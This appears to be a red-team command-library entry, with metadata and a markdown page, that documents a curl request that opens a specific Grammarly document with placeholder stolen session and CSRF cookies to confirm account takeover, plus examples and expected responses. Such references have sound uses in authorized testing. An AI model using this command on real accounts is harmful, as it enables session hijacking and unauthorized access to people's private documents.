---
data: >-
  curl https://app.grammarly.com/ddocs/417782102 --cookie
  "grauth=STOLEN_GRAUTH_VALUE" --cookie "csrf-token=STOLEN_CSRF_VALUE" -I
tags:
  - http-request
  - cookie-auth
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 98d039cb-43f3-46ad-8dcc-0341ccdf336a
created_at: '2025-12-14T00:11:16.487Z'
updated_at: '2025-12-14T00:11:16.487Z'
verified: false
validated: true
submitted: true
---
# curl Access Victim Document

## Command

```bash
curl https://app.grammarly.com/ddocs/417782102 --cookie "grauth=STOLEN_GRAUTH_VALUE" --cookie "csrf-token=STOLEN_CSRF_VALUE" -I
```

## Description

This command uses curl to send an HTTP request to access a Grammarly document using stolen session cookies, verifying account takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-I` | Fetches headers only | Yes |
| `--cookie "grauth=STOLEN_GRAUTH_VALUE"` | Sets the grauth authentication cookie | Yes |
| `--cookie "csrf-token=STOLEN_CSRF_VALUE"` | Sets the CSRF protection token | Yes |

## Examples

### Basic Usage

```bash
curl https://app.grammarly.com/ddocs/417782102 --cookie "grauth=STOLEN_GRAUTH_VALUE" --cookie "csrf-token=STOLEN_CSRF_VALUE" -I
```

### Advanced Usage

```bash
curl https://app.grammarly.com/ddocs/417782102 --cookie "grauth=STOLEN_GRAUTH_VALUE" --cookie "csrf-token=STOLEN_CSRF_VALUE" -I -v
```

## Expected Output

HTTP 200 response headers if cookies are valid, indicating successful access; HTTP 301 if invalid.

## Related

- [[procedures/Access-Victim-Account-with-Stolen-Cookies]]
- [[tools/curl]]
